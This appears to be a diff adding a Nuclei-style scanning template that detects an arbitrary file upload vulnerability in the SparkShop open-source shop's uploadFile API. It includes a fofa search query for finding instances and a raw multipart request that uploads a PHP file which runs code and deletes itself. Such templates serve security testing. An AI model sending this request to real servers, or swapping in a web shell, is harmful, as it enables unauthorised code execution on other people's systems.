@@ -1,0 +1,41 @@
+id: SparkShop-uploadFile-File-upload
+
+info:
+  name: SparkShop开源商城 uploadFile 接口任意文件上传漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: "SparkShop"
+      SparkShop开源商城的uploadFile接口存在任意文件上传漏洞。攻击者可通过该漏洞在服务器端部署恶意负载，进而实现远程代码执行，最终可能导致对整个Web服务器的控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486929&idx=1&sn=8a56acbbb229a08f4f76595a0dba937e&chksm=c267b8e2f51031f45ee7ff04194227324c32895b85b15e387644c4a74d6092b347d8aa550ca9&token=239710718&lang=zh_CN#rd
+  tags: SparkShop
+
+
+http:
+- raw:
+  - |
+    POST /api/Common/uploadFile HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+    --d0b7a0d40eed0e32904c8017b09eb305
+    Content-Disposition: form-data; name="file";filename="rce.php"
+
+    <?php print(111*222);unlink(__FILE__);?>
+    --d0b7a0d40eed0e32904c8017b09eb305--
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'upload success'
+  - type: status
+    status:
+    - 200
+
+
+
+
